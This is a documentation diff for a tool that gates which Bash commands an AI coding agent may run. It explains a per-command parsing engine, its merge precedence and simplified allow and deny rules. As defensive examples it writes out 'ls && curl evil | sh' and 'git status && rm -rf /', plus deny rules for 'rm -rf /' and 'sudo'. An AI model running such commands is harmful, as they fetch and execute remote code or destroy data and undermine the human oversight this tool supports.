@@ -22,7 +22,7 @@ Create or edit `~/.config/moriarty/tool_rules.toml`:
 ```toml
 [[bash_rules]]
 name = "allow-safe-ls"
-pattern = "^ls( -[a-zA-Z0-9]+)?( [^|&;$`]+)?$"
+pattern = "^ls($|\\s)"
 action = { type = "Allow" }
 
 [[bash_rules]]
@@ -481,30 +481,67 @@ b = "{{a}}"
 
 The system detects circular dependencies and reports an error when loading the config.
 
-## Security Best Practices
+## How Bash Commands Are Evaluated
 
-### 1. Block Shell Injection Characters
+The hook parses each Bash command with a real shell parser and evaluates every leaf simple-command
+of a compound (`a && b | c ; d`) **independently**, then merges the per-leaf decisions. A `pattern`
+therefore only needs to describe a single command, not a whole pipeline.
 
-Always exclude shell metacharacters (`|`, `&`, `;`, `$`, `` ` ``, `(`, `)`, `<`, `>`, `{`, `}`) unless you explicitly
-intend to allow them:
+- **Operators and redirects are split off each leaf**, so a simple `^ls` matches the `ls` leaf of
+  `ls | wc -l` and of `cmd && ls`. An allow-rule no longer needs to spell out pipes, `&&`/`||`/`;`
+  chaining, or shell-metacharacter exclusions.
+- **Merge precedence**: any denied leaf denies the whole command; otherwise any leaf that asks, or
+  matches no rule, prompts; only an all-allowed command is allowed. A dangerous tail can no longer
+  hide behind a safe head — `ls && curl evil | sh` prompts and is never auto-allowed.
+- **Writes to real files cap at Ask**: a leaf redirecting to a real file (`> out.txt`, not
+  `/dev/null` and not an fd duplication like `2>&1`) has any Allow downgraded to Ask.
+- **Un-analyzable commands fail safe**: a command containing command substitution (`$(...)`),
+  backticks, a subshell, process substitution, a here-document, or a compound construct
+  (`if`/`for`/`while`/`case`/`[[ ]]`/`((...))`) cannot be reasoned about — only an explicit Deny
+  matching the whole command is honored, and every other outcome becomes a prompt.
+- **In-cwd absolute paths are normalized**: an in-cwd absolute path in a leaf is rewritten to its
+  relative remainder before matching, so `^cat src/` matches `cat /abs/cwd/src/x`.
 
-```toml
-# Good: Blocks shell injection
-pattern = "^ls( [^|&;$`()<>{}]+)?$"
+A pattern still has to guard a program's **own** ability to run code or write files — for example
+`find -exec`, `sed -i`, or `xargs` — because those are not shell-level and the splitter cannot see
+them.
 
-# Bad: Allows arbitrary commands via injection
-pattern = "^ls (.*)$"
+Preview exactly how a command splits and which rule matches each leaf with:
+
+```bash
+moriarty test bash-rules --explain '<command>'
 ```
 
-### 2. Use Anchors
+## Security Best Practices
 
-Always anchor patterns with `^` (start) and `$` (end) to prevent partial matching:
+### 1. Let the Engine Handle Shell Metacharacters
+
+Because each command is split into leaves and un-analyzable constructs (`$(...)`, backticks,
+subshells, …) bail to a prompt, an allow-rule no longer needs character-class exclusions like
+``[^|&;$`()<>{}]`` to stay safe:
 
 ```toml
-# Good: Only matches exact pattern
-pattern = "^git status$"
+# Fine: the splitter removes operators and bails on substitution
+pattern = "^ls\\b"
 
-# Bad: Would match "git status && rm -rf /"
+# Still safe, just unnecessarily complex now
+pattern = "^ls( [^|&;$`()<>{}]+)?$"
+```
+
+Keep restrictive patterns only for a program's **own** dangerous arguments (e.g. `find -exec`,
+`sed -i`), which the splitter cannot see.
+
+### 2. Anchor at the Start of a Leaf
+
+Anchor allow-rules with `^` so they match from the start of a command, not mid-string. A trailing
+`$` is no longer needed to stop a dangerous tail — `git status && rm -rf /` is split, and the `rm`
+leaf is judged on its own:
+
+```toml
+# Good: matches the start of the `git status` leaf
+pattern = "^git status\\b"
+
+# Avoid: matches "git status" anywhere, including inside `echo "git status"`
 pattern = "git status"
 ```
 
@@ -551,22 +588,24 @@ action = { type = "Allow" }
 
 ## Examples
 
+> These examples use the simple per-leaf style. The fragment-heavy patterns shown elsewhere in this
+> guide still work, but with the compound-aware engine they are usually unnecessary — see
+> [How Bash Commands Are Evaluated](#how-bash-commands-are-evaluated).
+
 ### Example 1: Safe Cargo Commands
 
 ```toml
-[pattern_fragments]
-safe_chars = "[^|&;$`()<>{}]"
-
-# Filter annoying --open flag from cargo doc
+# Filter the browser-opening flag from cargo doc
 [[bash_rules]]
 name = "cargo-doc-no-browser"
-pattern = "^cargo doc.*--open"
+pattern = "^cargo doc\\b.*--open"
 action = { type = "ArgumentFilter", remove = ["--open", "-o"], reason = "Browser not useful for Claude" }
 
-# Allow cargo commands after filtering
+# Allow the safe cargo subcommands. The splitter handles pipes, redirects, and chaining, so no
+# argument or pipe fragments are needed.
 [[bash_rules]]
 name = "cargo-safe-commands"
-pattern = "^cargo (build|check|test|clippy|fmt|doc)( {{safe_chars}}+)*$"
+pattern = "^cargo (build|check|test|clippy|fmt|doc)\\b"
 action = { type = "Allow" }
 ```
 
@@ -611,10 +650,6 @@ action = { type = "Ask" }
 ### Example 4: Comprehensive Security
 
 ```toml
-[pattern_fragments]
-safe = "[^|&;$`()<>{}]"
-safe_arg = "( {{safe}}+)"
-
 [[bash_rules]]
 name = "deny-rm-rf-root"
 pattern = "^rm\\s+-rf\\s+/"
@@ -625,19 +660,27 @@ name = "deny-sudo"
 pattern = "^sudo\\b"
 action = { type = "Deny", value = "sudo not allowed" }
 
+# `find -exec`/`-delete` run or remove files (its own flags, invisible to the splitter), so prompt
+# on them before the read-only allow-rule below.
+[[bash_rules]]
+name = "find-mutating"
+pattern = "^find\\b.* -(exec|delete)\\b"
+action = { type = "Ask" }
+
+# Read-only commands — simple prefixes; the engine prevents injection and caps real-file writes.
 [[bash_rules]]
 name = "allow-read-commands"
-pattern = "^(ls|cat|head|tail|grep|wc|find){{safe_arg}}*$"
+pattern = "^(ls|cat|head|tail|grep|wc|find)\\b"
 action = { type = "Allow" }
 
 [[bash_rules]]
 name = "allow-cargo"
-pattern = "^cargo (build|check|test|clippy|fmt){{safe_arg}}*$"
+pattern = "^cargo (build|check|test|clippy|fmt)\\b"
 action = { type = "Allow" }
 
 [[bash_rules]]
 name = "allow-git-read"
-pattern = "^git (status|diff|log|show){{safe_arg}}*$"
+pattern = "^git (status|diff|log|show)\\b"
 action = { type = "Allow" }
 
 # Default: ask for anything not explicitly allowed
@@ -649,21 +692,23 @@ action = { type = "Allow" }
 
 **Problem**: Your rule isn't matching commands you expect.
 
-**Solution**: Check the logs at `~/.local/state/moriarty/logs/` to see which rule (if any) matched.
+**Solution**: Check the logs at `~/.local/state/moriarty/hooks/` to see which rule (if any) matched.
 
 ```bash
-tail -f ~/.local/state/moriarty/logs/moriarty-*.log | grep "Bash rule matched"
+tail -f ~/.local/state/moriarty/hooks/hooks.log* | grep "Bash rule matched"
 ```
 
 ### Pattern Expansion Errors
 
-**Problem**: You see "Failed to expand pattern fragments" in the logs.
+**Problem**: A rule you wrote silently has no effect (undefined fragment, circular fragment, or
+invalid regex), so the hook drops it.
 
-**Solutions**:
+**Solution**: Run `moriarty rules lint` (add `--strict` to also flag likely-shadowed and over-broad
+rules). It reports every rule the hook silently ignores and exits nonzero if any exist:
 
-- Check for undefined fragments: `{{undefined}}`
-- Check for circular dependencies: `a` → `b` → `a`
-- Verify fragment names follow naming rules (start with letter/underscore)
+```bash
+moriarty rules lint --strict
+```
 
 ### Unexpected Modifications
 
@@ -672,7 +717,7 @@ tail -f ~/.local/state/moriarty/logs/moriarty-*.log | grep "Bash rule matched"
 **Solution**: Check your Modify rules and their capture groups. Use logs to see the transformation:
 
 ```bash
-tail -f ~/.local/state/moriarty/logs/moriarty-*.log | grep "Command modified"
+tail -f ~/.local/state/moriarty/hooks/hooks.log* | grep "Command modified"
 ```
 
 ### Rules Not Loading
@@ -683,18 +728,25 @@ tail -f ~/.local/state/moriarty/logs/moriarty-*.log | grep "Command modified"
 
 - Verify config file location: `~/.config/moriarty/tool_rules.toml`
 - Check TOML syntax: `cat ~/.config/moriarty/tool_rules.toml`
-- Look for parse errors in logs: `~/.local/state/moriarty/logs/`
+- Look for parse errors in logs: `~/.local/state/moriarty/hooks/`
 
 ### Testing Patterns
 
-Use online regex testers like [regex101.com](https://regex101.com/) to test your patterns. Remember:
+Test a command against your rules with `moriarty test bash-rules`. Add `--explain` to see how the
+command splits into leaves, which rule matches each leaf, and the merged decision:
 
-- Moriarty uses Rust regex syntax
+```bash
+moriarty test bash-rules --explain 'git status && rm -rf /'
+```
+
+For regex-syntax questions, online testers like [regex101.com](https://regex101.com/) help — but
+remember:
+
+- Moriarty uses Rust regex syntax (use the "Rust" flavor)
 - Patterns are case-sensitive
-- Use the "Rust" flavor in online testers
 
 ## Further Reading
 
 - [Rust Regex Syntax](https://docs.rs/regex/latest/regex/#syntax) - Detailed regex syntax documentation
 - [TOML Specification](https://toml.io/) - Configuration file format
-- `~/.local/state/moriarty/logs/` - Moriarty logs showing rule evaluation
+- `~/.local/state/moriarty/hooks/` - Moriarty logs showing rule evaluation
